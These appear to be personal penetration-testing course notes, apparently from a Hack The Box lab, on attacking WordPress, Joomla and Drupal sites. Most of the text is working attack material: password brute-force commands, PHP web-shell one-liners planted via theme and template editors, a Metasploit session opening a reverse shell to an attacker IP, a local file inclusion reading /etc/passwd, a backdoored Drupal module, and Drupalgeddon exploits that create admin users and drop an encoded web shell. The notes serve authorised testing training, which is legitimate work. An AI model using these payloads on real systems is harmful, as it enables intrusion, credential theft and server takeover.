	> This scan helped us confirm some of the things we uncovered from manual enumeration (WordPress core version 5.8 and directory listing enabled), showed us that the theme that we identified was not exactly correct (Transport Gravity is in use which is a child theme of Business Gravity), uncovered another username (john), and showed that automated enumeration on its own is often not enough (missed the wpDiscuz and Contact Form 7 plugins). WPScan provides information about known vulnerabilities. The report output also contains URLs to PoCs, which would allow us to exploit these vulnerabilities.

	> The approach we took in this section, combining both manual and automated enumeration, can be applied to almost any application we uncover. Scanners are great and are very useful but cannot replace the human touch and a curious mind. Honing our enumeration skills can set us apart from the crowd as excellent penetration testers.

* Moving On
	> From the data we gathered manually and using WPScan, we now know the following:

    	- The site is running WordPress core version 5.8, which does suffer from some vulnerabilities that do not seem interesting at this point
    	- The installed theme is Transport Gravity
    	- The following plugins are in use: Contact Form 7, mail-masta, wpDiscuz
    	- The wpDiscuz version is 7.0.4, which suffers from an unauthenticated remote code execution vulnerability
    	- The mail-masta version is 1.0.0, which suffers from a Local File Inclusion vulnerability as well as SQL injection
    	- The WordPress site is vulnerable to user enumeration, and the users admin and john are confirmed to be valid users
    	- Directory listing is enabled throughout the site, which may lead to sensitive data exposure
    	- XML-RPC is enabled, which can be leveraged to perform a password brute-forcing attack against the login page using WPScan, Metasploit(https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/), etc.


-=-=
[+] Attacking WordPress
	> We've confirmed that the company website is running on WordPress and have enumerated the version and installed plugins. Let's now look for attack paths and try to gain access to the internal network.
	> There are several ways we can abuse built-in functionality to attack a WordPress installation. We will cover login brute forcing against the wp-login.php page and remote code execution via the theme editor. These two tactics build on each other as we need first to obtain valid credentials for an administrator-level user to log in to the WordPress back-end and edit a theme.

* Login Bruteforce
	> WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks, xmlrpc(https://kinsta.com/blog/xmlrpc-php/) and wp-login. The wp-login method will attempt to brute force the standard WordPress login page, while the xmlrpc method uses WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it’s faster.

		m1l0js@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

	> The --password-attack flag is used to supply the type of attack. The -U argument takes in a list of users or a file containing user names. This applies to the -P passwords option as well. The -t flag is the number of threads which we can adjust up or down depending. WPScan was able to find valid credentials for one user, john:firebird1.

* Code Execution
	> With administrative access to WordPress, we can modify the PHP source code to execute system commands. Log in to WordPress with the credentials for the john user, which will redirect us to the admin panel. Click on Appearance on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.
	> Click on Select after selecting the theme, and we can edit an uncommon page such as 404.php to add a web shell.
		Code: php
		system($_GET[0]);

	> The code above should let us execute commands via the GET parameter 0. We add this single line to the file just below the comments to avoid too much modification of the contents.
		(http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen)

	> Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name>. We can interact with the web shell via the browser or using cURL. As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.

		m1l0js@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
		uid=33(www-data) gid=33(www-data) groups=33(www-data)

	> The wp_admin_shell_upload module from Metasploit can be used to upload a shell and execute it automatically.
	> The module uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell. We first need to set the necessary options.

		msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
			[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
			msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
			msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
			msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
			msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
			msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
			msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local

	> We can then issue the show options command to ensure that everything is set up properly. In this lab example, we must specify both the vhost and the IP address, or the exploit will fail with the error Exploit aborted due to failure: not-found: The target does not appear to be using WordPress.

	> Once we are satisfied with the setup, we can type exploit and obtain a reverse shell. From here, we could start enumerating the host for sensitive data or paths for vertical/horizontal privilege escalation and lateral movement.

		msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
			[*] Started reverse TCP handler on 10.10.14.15:4444 
			[*] Authenticating with WordPress using doug:jessica1...
			[+] Authenticated with WordPress
			[*] Preparing payload...
			[*] Uploading payload...
			[*] Executing the payload at /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php...
			[*] Sending stage (39264 bytes) to 10.129.42.195
			[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816) at 2021-09-20 19:43:46 -0400
			i[+] Deleted wCoUuUPfIO.php
			[+] Deleted CczIptSXlr.php
			[+] Deleted ../CczIptSXlr

		meterpreter > getuid
			Server username: www-data (33)

	> In the above example, the Metasploit module uploaded the wCoUuUPfIO.php file to the /wp-content/plugins directory. Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail. During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. At the very least, our report should have an appendix section that lists the following information—more on this in a later module.

    	- Exploited systems (hostname/IP and method of exploitation)
    	- Compromised users (account name, method of compromise, account type (local or domain))
    	- Artifacts created on systems
    	- Changes (such as adding a local admin user or modifying group membership)

* Leveraging Known Vulnerabilities
	> Over the years, WordPress core has suffered from its fair share of vulnerabilities, but the vast majority of them can be found in plugins. According to the WordPress Vulnerability Statistics page hosted here(https://wpscan.com/statistics), at the time of writing, there were 23,595 vulnerabilities in the WPScan database. These vulnerabilities can be broken down as follows:

    	- 4% WordPress core
    	- 89% plugins
    	- 7% themes

	> The number of vulnerabilities related to WordPress has grown steadily since 2014, likely due to the sheer amount of free (and paid) themes and plugins available, with more and more being added every week. For this reason, we must be extremely thorough when enumerating a WordPress site as we may find plugins with recently discovered vulnerabilities or even old, unused/forgotten plugins that no longer serve a purpose on the site but can still be accessed.
	> Note: We can use the waybackurls(https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.

* Vulnerable Plugins - mail-masta

	> Let's look at a few examples. The plugin mail-masta is no longer supported but has had over 2,300 downloads over the years. It's not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an unauthenticated SQL injection and a Local File Inclusion.
	> Let's take a look at the vulnerable code for the mail-masta plugin.
		Code: php

		<?php 

		include($_GET['pl']);
		global $wpdb;

		$camp_id=$_POST['camp_id'];
		$masta_reports = $wpdb->prefix . "masta_reports";
		$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

		echo $count[0]->co;

		?>

	> As we can see, the pl parameter allows us to include a file without any type of input validation or sanitization. Using this, we can include arbitrary files on the webserver. Let's exploit this to retrieve the contents of the /etc/passwd file using cURL.

		m1l0js@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

* Vulnerable Plugins - wpDiscuz

	> wpDiscuz is a WordPress plugin for enhanced commenting on page posts. At the time of writing, the plugin had over 1.6 million downloads and over 90,000 active installations, making it an extremely popular plugin that we have a very good chance of encountering during an assessment. Based on the version number (7.0.4), this exploit(https://www.exploit-db.com/exploits/49967) has a pretty good shot of getting us command execution. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution. More on the mime type detection functions bypass can be found here(https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/)
	> The exploit script takes two parameters: -u the URL and -p the path to a valid post.

		m1l0js@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
			[+] Response length:[102476] | code:[200]
			[!] Got wmuSecurity value: 5c9398fcdb
			[!] Got wmuSecurity value: 1 
			[+] Generating random name for Webshell...
			[!] Generated webshell name: uthsdkbywoxeebg
			[!] Trying to Upload Webshell..
			[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 
			> id
			[x] Failed to execute PHP code...

	> The exploit as written may fail, but we can use cURL to execute commands using the uploaded web shell. We just need to append ?cmd= after the .php extension to run commands which we can see in the exploit script.

		m1l0js@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

	> In this example, we would want to make sure to clean up the uthsdkbywoxeebg-1629904090.8191.php file and once again list it as a testing artifact in the appendices of our report.

-=-=-=-=
[+] Joomla - Discovery & Enumeration

	> Joomla, released in August 2005 is another free and open-source CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more. It is written in PHP and uses MySQL in the backend. Like WordPress, Joomla can be enhanced with over 7,000 extensions and over 1,000 templates. There are up to 2.5 million sites on the internet running Joomla. Here are some interesting statistics about Joomla:

    	- Joomla accounts for 3.5% of the CMS market share
    	- Joomla is 100% free and means "all together" in Swahili (phonetic spelling of "Jumla")
    	- The Joomla community has close to 700,000 in its online forums
    	- Joomla powers 3% of all websites on the internet, nearly 25,000 of the top 1 million sites worldwide (just 10% of the reach of WordPress)
    	- Some notable organizations that use Joomla include eBay, Yamaha, Harvard University, and the UK government
    	- Over the years, 770 different developers have contributed to Joomla

	> Joomla collects some anonymous usage statistics(https://developer.joomla.org/about/stats.html) such as the breakdown of Joomla, PHP and database versions and server operating systems in use on Joomla installations. This data can be queried via their public API(https://developer.joomla.org/about/stats/api.html)
	> Querying this API, we can see over 2.7 million Joomla installs!
		m1l0js@htb[/htb]$ curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
			{
			    "data": {
			        "cms_version": {
			            "3.0": 0,
			            "3.1": 0,
			            "3.10": 3.49,
			            "3.2": 0.01,
			            "3.3": 0.02,
			            "3.4": 0.05,
			            "3.5": 13,
			            "3.6": 24.29,
			            "3.7": 8.5,
			            "3.8": 18.84,
			            "3.9": 30.28,
			            "4.0": 1.52,
			            "4.1": 0
			        },
			        "total": 2776276
			    }
			}

* Discovery/Footprinting
	> Let's assume that we come across an e-commerce site during an external penetration test. At first glance, we are not exactly sure what is running, but it does not appear to be fully custom. If we can fingerprint what the site is running on, we may be able to uncover vulnerabilities or misconfigurations. Based on the limited information, we assume that the site is running Joomla, but we must confirm that fact and then figure out the version number and other information such as installed themes and plugins.
	> We can often fingerprint Joomla by looking at the page source, which tells us that we are dealing with a Joomla site.
		m1l0js@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla
			<meta name="generator" content="Joomla! - Open Source Content Management" />

	> The robots.txt file for a Joomla site will often look like this:
		User-agent: *
		Disallow: /administrator/
		Disallow: /bin/
		Disallow: /cache/
		Disallow: /cli/
		Disallow: /components/
		Disallow: /includes/
		Disallow: /installation/
		Disallow: /language/
		Disallow: /layouts/
		Disallow: /libraries/
		Disallow: /logs/
		Disallow: /modules/
		Disallow: /plugins/
		Disallow: /tmp/

	> We can also often see the telltale Joomla favicon (but not always). We can fingerprint the Joomla version if the README.txt file is present.
		m1l0js@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5
			1- What is this?
				* This is a Joomla! installation/upgrade package to version 3.x
				* Joomla! Official site: https://www.joomla.org
				* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
				* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging

	> In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the media/system/js/ directory or by browsing to administrator/manifests/files/joomla.xml.
		m1l0js@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
			<?xml version="1.0" encoding="UTF-8"?>
			<extension version="3.6" type="file" method="upgrade">
			  <name>files_joomla</name>
			  <author>Joomla! Project</author>
			  <authorEmail>admin@joomla.org</authorEmail>
			  <authorUrl>www.joomla.org</authorUrl>
			  <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright>
			  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
			  <version>3.9.4</version>
			  <creationDate>March 2019</creationDate>

			 <SNIP>

	> The cache.xml file can help to give us the approximate version. It is located at plugins/system/cache/cache.xml.

* Enumeration

	> Let's try out droopescan(https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
	> We can clone the Git repo and install it manually or install via pip.
		m1l0js@htb[/htb]$ sudo pip3 install droopescan

	> Once the installation is complete, we can confirm that the tool is working by running droopescan -h.
		m1l0js@htb[/htb]$ droopescan -h

	> We can access a more detailed help menu by typing droopescan scan --help.
	> Let's run a scan and see what it turns up.
		m1l0js@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/

	> As we can see, it did not turn up much information aside from the possible version number. We can also try out JoomlaScan(https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP joomscan(https://github.com/OWASP/joomscan) tool. JoomlaScan is a bit out-of-date and requires Python2.7 to run. We can get it running by first making sure some dependencies are installed.
		m1l0js@htb[/htb]$ sudo python2.7 -m pip install urllib3
		m1l0js@htb[/htb]$ sudo python2.7 -m pip install certifi
		m1l0js@htb[/htb]$ sudo python2.7 -m pip install bs4

	> While a bit out of date, it can be helpful in our enumeration. Let's run a scan.
		m1l0js@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local

	> While not as valuable as droopescan, this tool can help us find accessible directories and files and may help with fingerprinting installed extensions. At this point, we know that we are dealing with Joomla 3.9.4. The administrator login portal is located at http://dev.inlanefreight.local/administrator/index.php. Attempts at user enumeration return a generic error message.
		Warning
		Username and password do not match or you do not have an account yet.

	> The default administrator account on Joomla installs is admin, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this script(https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.

		m1l0js@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 
	> And we get a hit with the credentials admin:admin. Someone has not been following best practices!


-=-=-
[+] Attacking Joomla

> We now know that we are dealing with a Joomla e-commerce site. If we can gain access, we may be able to land in the client's internal environment and begin enumerating the internal domain environment. Like WordPress and Drupal, Joomla has had its fair share of vulnerabilities against the core application and vulnerable extensions. Furthermore, like the others, it is possible to gain remote code execution if we can log in to the admin backend.

* Abusing Built-In Functionality

	> During the Joomla enumeration phase and the general research hunting for company data, we may come across leaked credentials that we can use for our purposes. Using the credentials that we obtained in the examples from the last section, admin:admin, let's log in to the target backend at http://dev.inlanefreight.local/administrator. Once logged in, we can see many options available to us. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.
	> From here, we can click on Templates on the bottom left under Configuration to pull up the templates menu.
	> Next, we can click on a template name. Let's choose protostar under the Template column header. This will bring us to the Templates: Customise page.
	> Finally, we can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.
	> Let's choose the error.php page. We'll add a PHP one-liner to gain code execution as follows.
		Code: php
		system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

	> Once this is in, click on Save & Close at the top and confirm code execution using cURL.
		m1l0js@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
		uid=33(www-data) gid=33(www-data) groups=33(www-data)

	> From here, we can upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors or focus on lateral movement within the corporate network. We should be sure, once again, to note down this change for our report appendices and make every effort to remove the PHP snippet from the error.php page.

* Leveraging Known Vulnerabilities

	> At the time of writing, there have been 426(https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html) Joomla-related vulnerabilities that received CVEs. However, just because a vulnerability was disclosed and received a CVE does not mean that it is exploitable or a working public PoC exploit is available. Like with WordPress, critical vulnerabilities (such as those remote code execution) that affect Joomla core are rare. Searching a site such as exploit-db shows over 1,400 entries for Joomla, with the vast majority being for Joomla extensions.
	> Let's dig into a Joomla core vulnerability that affects version 3.9.4, which our target http://dev.inlanefreight.local/ was found to be running during our enumeration. Checking the Joomla downloads(https://www.joomla.org/announcements/release-news/5761-joomla-3-9-4-release.html) page, we can see that 3.9.4 was released in March of 2019. Though it is out of date as we are on Joomla 4.0.3 as of September 2021, it is entirely possible to run into this version during an assessment, especially against a large enterprise that may not maintain a proper application inventory and is unaware of its existence.
	> Researching a bit, we find that this version of Joomla is likely vulnerable to CVE-2019-10945(https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) which is a directory traversal and authenticated file deletion vulnerability. We can use this(https://www.exploit-db.com/exploits/46710) exploit script to leverage the vulnerability and list the contents of the webroot and other directories. The python3 version of this same script can be found here(https://github.com/dpgg101/CVE-2019-10945). We can also use it to delete files (not recommended). This could lead to access to sensitive files such as a configuration file or script holding credentials if we can then access it via the application URL. An attacker could also cause damage by deleting necessary files if the webserver user has the proper permissions.

	> We can run the script by specifying the --url, --username, --password, and --dir flags. As pentesters, this would only be useful to us if the admin login portal is not accessible from the outside since, armed with admin creds, we can gain remote code execution, as we saw above.
		m1l0js@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 

-=-=-==-
[+] Drupal - Discovery & Enumeration

	> Drupal, launched in 2001 is the third and final CMS we'll cover on our tour through the world of common applications. Drupal is another open-source CMS that is popular among companies and developers. Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there's no DBMS installed. Like WordPress, Drupal allows users to enhance their websites through the use of themes and modules. At the time of writing, the Drupal project has nearly 43,000 modules and 2,900 themes and is the third most popular CMS by market share. Here are a few interesting statistics on Drupal gathered from various sources:

    	- Around 1.5% of sites on the internet run Drupal (over 1.1 million sites!), 5% of the top 1 million websites on the internet, and 7% of the top 10,000 sites
    	- Drupal accounts for around 2.4% of the CMS market
    	- It is available in 100 languages
    	- Drupal is community-oriented and has over 1.3 million members
    	- Drupal 8 was built by 3,290 contributors, 1,288 companies, and help from the community
    	- 33 of the Fortune 500 companies use Drupal in some way
    	- 56% of government websites across the world use Drupal
    	- 23.8% of universities, colleges, and schools use Drupal worldwide
    	- Some major brands that use Drupal include: Tesla and Warner Bros Records

	> According to the Drupal website there are just around 950,000 instances of Drupal in use at the time of writing (distributed from version 5.x through version 9.3.x, as of September 5, 2021). As we can see from these statistics, Drupal usage has held steadily between 900,000 and 1.1 million instances between June 2013 and September 2021. These statistics do not account for EVERY instance of Drupal in use worldwide, but rather instances running the Update Status module, which checks in with drupal.org daily to look for any new versions of Drupal or updates to modules in use.

* Discovery/Footprinting
	> During an external penetration test, we encounter what appears to be a CMS, but we know from a cursory review that the site is not running WordPress or Joomla. We know that CMS' are often "juicy" targets, so let's dig into this one and see what we can uncover.
	> A Drupal website can be identified in several ways, including by the header or footer message Powered by Drupal, the standard Drupal logo, the presence of a CHANGELOG.txt file or README.txt file, via the page source, or clues in the robots.txt file such as references to /node.
		m1l0js@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal
			<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
			      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>

	> Another way to identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form /node/<nodeid>.
	> For example, the blog post above is found to be at /node/1. This representation is helpful in identifying a Drupal website when a custom theme is in use.
	> Note: Not every Drupal installation will look the same or display the login page or even allow users to access the login page from the internet.
	> Drupal supports three types of users by default:

    	- Administrator: This user has complete control over the Drupal website.
    	- Authenticated User: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
    	- Anonymous: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

* Enumeration
	> Once we have discovered a Drupal instance, we can do a combination of manual and tool-based (automated) enumeration to uncover the version, installed plugins, and more. Depending on the Drupal version and any hardening measures that have been put in place, we may need to try several ways to identify the version number. Newer installs of Drupal by default block access to the CHANGELOG.txt and README.txt files, so we may need to do further enumeration. Let's look at an example of enumerating the version number using the CHANGELOG.txt file. To do so, we can use cURL along with grep, sed, head, etc.

		m1l0js@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
			Drupal 7.57, 2018-02-21

	> Here we have identified an older version of Drupal in use. Trying this against the latest Drupal version at the time of writing, we get a 404 response.
		m1l0js@htb[/htb]$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
			<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL "http://drupal.inlanefreight.local/CHANGELOG.txt" was not found on this server.</p></body></html>

	> There are several other things we could check in this instance to identify the version. Let's try a scan with droopescan as shown in the Joomla enumeration section. Droopescan has much more functionality for Drupal than it does for Joomla.
	> Let's run a scan against the http://drupal.inlanefreight.local host.

		m1l0js@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local
	
	> This instance appears to be running version 8.9.1 of Drupal. At the time of writing, this was not the latest as it was released in June 2020. A quick search for Drupal-related vulnerabilities(https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html) does not show anything apparent for this core version of Drupal. In this instance, we would next want to look at installed plugins or abusing built-in functionality.
-=-=-==
[+] Attacking Drupal

	> Now that we've confirmed that we are facing Drupal and fingerprinted the version let's look and see what misconfigurations and vulnerabilities we can uncover to attempt to gain internal network access.
	> Unlike some CMS', obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script.

* Leveraging the PHP Filter Module
	> In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated."
	> From here, we could tick the check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page.
	> We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard system($_GET['cmd']); we open up ourselves up to a "drive-by" attacker potentially coming across our web shell. Though unlikely, better safe than sorry!
		Code: php

		<?php
		system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
		?>

	> We also want to make sure to set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3. Once saved, we can either request execute commands in the browser by appending ?dcfdd5e021a869fcc6dfaef8bf31377e=id to the end of the URL to run the id command or use cURL on the command line. From here, we could use a bash one-liner to obtain reverse shell access.

		m1l0js@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
			uid=33(www-data) gid=33(www-data) groups=33(www-data)

	> From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. We'd start by downloading the most recent version of the module from the Drupal website.
		m1l0js@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz

	> Once downloaded go to Administration > Reports > Available updates.
	> Note: Location may differ based on the Drupal version and may be under the Extend menu.
	> From here, click on Browse, select the file from the directory we downloaded it to, and then click Install.
	> Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.
	
	> With either of these examples, we should keep our client apprised and obtain permission before making these sorts of changes. Also, once we are done, we should remove or disable the PHP Filter module and delete any pages that we created to gain remote code execution.

* Uploading a Backdoored Module

	> Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as CAPTCHA. Scroll down and copy the link for the tar.gz archive.
	> Download the archive and extract its contents.

		m1l0js@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
		m1l0js@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz

	> Create a PHP web shell with the contents:
		Code: php

		<?php
		system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
		?>

	> Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
		Code: html

		<IfModule mod_rewrite.c>
		RewriteEngine On
		RewriteBase /
		</IfModule>

	> The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.

		m1l0js@htb[/htb]$ mv shell.php .htaccess captcha
		m1l0js@htb[/htb]$ tar cvf captcha.tar.gz captcha/

		captcha/
		captcha/.travis.yml
		captcha/README.md
		captcha/captcha.api.php
		captcha/captcha.inc
		captcha/captcha.info.yml
		captcha/captcha.install

		<SNIP>

	> Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.
	> Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands.

		m1l0js@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
			uid=33(www-data) gid=33(www-data) groups=33(www-data)

* Leveraging Known Vulnerabilities

	> Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed Drupalgeddon. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.

    	- CVE-2014-3704(https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
    	- CVE-2018-7600(https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
    	- CVE-2018-7602(https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

* Drupalgeddon
	> As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this PoC(https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution.
	> Running the script with the -h flag shows us the help menu.
		m1l0js@htb[/htb]$ python2.7 drupalgeddon.py 

	> Here we see that we need to supply the target URL and a username and password for our new admin account. Let's run the script and see if we get a new admin user.
		m1l0js@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
			[!] VULNERABLE!

			[!] Administrator user created!

			[*] Login: hacker
			[*] Pass: pwnd
			[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node

	> Now let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.
	> We could also use the exploit/multi/http/drupal_drupageddon(https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit module to exploit this.

* Drupalgeddon2
	> We can use this(https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.
		m1l0js@htb[/htb]$ python3 drupalgeddon2.py 
			Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
			Check: http://drupal-dev.inlanefreight.local/hello.txt

	> We can check quickly with cURL and see that the hello.txt file was indeed uploaded.
		m1l0js@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt
			;-)

	> Now let's modify the script to gain remote code execution by uploading a malicious PHP file.
		Code: php
		<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>

		m1l0js@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
			PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K

	> Next, let's replace the echo command in the exploit script with a command to write out our malicious PHP script.
 		echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php

	> Next, run the modified exploit script to upload our malicious PHP file.
		m1l0js@htb[/htb]$ python3 drupalgeddon2.py 
			Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
			Check: http://drupal-dev.inlanefreight.local/mrb3n.php

	> Finally, we can confirm remote code execution using cURL.
		m1l0js@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
		uid=33(www-data) gid=33(www-data) groups=33(www-data)

* Drupalgeddon3
